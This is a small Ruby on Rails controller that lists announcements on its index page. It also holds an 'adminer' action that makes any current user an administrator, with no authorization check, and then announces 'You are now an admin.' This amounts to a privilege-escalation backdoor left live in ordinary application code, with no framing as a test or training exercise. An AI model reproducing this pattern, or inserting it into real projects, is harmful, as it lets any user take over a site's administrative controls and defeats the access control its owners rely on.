class HomeController < ApplicationController
  def index
	@announcements = Announcement.all
  end
  def adminer
  	current_user.update_attribute :admin, true
  	render :inline => "You are now an admin."
  end
end
